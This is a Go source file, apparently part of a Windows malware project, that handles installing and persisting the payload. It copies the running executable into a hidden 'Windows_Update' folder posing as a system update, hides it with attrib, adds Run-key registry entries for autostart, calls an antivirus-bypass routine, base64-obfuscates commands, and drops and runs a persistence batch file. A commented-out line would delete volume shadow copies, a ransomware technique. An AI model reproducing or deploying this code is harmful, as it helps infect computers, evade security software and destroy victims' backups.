package install

import (
	"os"

	"../avbypass"
	"../base64"
	"../spread"
	"../utils"
	cp "github.com/cleversoap/go-cp"

	"github.com/SaturnsVoid/Process-Protection/process_protection"
)

var TARGET_FILE_NAME = utils.TARGET_FILE_NAME

func Install() {
	process_protection.Protect()

	// Checks if not running in home folder
	parent := spread.GetParentFolder()
	if parent != "Windows_Update" && spread.GetExeName() != TARGET_FILE_NAME {
		utils.Run("mkdir %APPDATA%\\Windows_Update")
		utils.Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f")
		os.Remove(os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
		err := cp.Copy(spread.GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+TARGET_FILE_NAME)
		// TODO: Spread here.
		if err == nil {
			utils.Run("attrib +H +S %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
			utils.Run("start " + os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
			os.Exit(0)
		}
	}
	avbypass.BypassAV()
	//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
	utils.Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
	//attrib +H +S %APPDATA%\\Windows_Update\\
	utils.Run(base64.Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)

	// TODO: Run with admin
	//Run("vssadmin.exe Delete Shadows /All /Quiet") //admin

}
func Uninstall() {
	utils.Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
	utils.Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f & del %APPDATA%\\Windows_Update /Q /F")
}

func PersistenceBat() {
	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
	DecodedRegAdd := base64.Decode(RegAdd)

	PERSIST, _ := os.Create("PERSIST.bat")

	PERSIST.WriteString("mkdir %APPDATA%\\Windows" + "\n")
	PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
	PERSIST.WriteString(string(DecodedRegAdd))

	PERSIST.Close()
	utils.Run("cmd /C PERSIST.bat")
	utils.Run("cmd /C del PERSIST.bat")
}
